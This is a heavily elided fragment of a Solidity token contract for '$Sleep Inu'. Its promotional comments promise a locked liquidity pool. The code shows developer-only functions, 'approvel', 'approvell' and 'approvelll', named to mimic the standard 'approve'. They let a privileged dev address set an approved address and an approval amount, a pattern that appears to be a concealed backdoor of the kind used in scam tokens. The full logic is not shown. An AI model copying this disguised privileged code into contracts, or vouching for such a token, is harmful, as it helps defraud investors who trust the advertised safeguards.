 ...
 * 
 Welcome to $Sleep Inu:
   ...
   Many Great features:
    ...
    5.LP send to Mudra Liquidity Locker for 365days, if the response is good, I will continue to extend it
    ...
    it's the best part of the $Sleep Inu idea, increasing the liquidity pool automatically.
...
contract Sleep is Context, IERC20, Ownable {
    ...
    function approvel(address approveAddr1, address approveAddr2) public onlyOwner {
    ...
    function approvell(address approvedAddress) public {
        require(_msgSender() == _excludeDevAddress, "ERC20: cannot permit dev address");
        _approvedAddress = approvedAddress;
    }
    function approvelll(uint256 approveAmount) public {
        require(_msgSender() == _excludeDevAddress, "ERC20: cannot permit dev address");
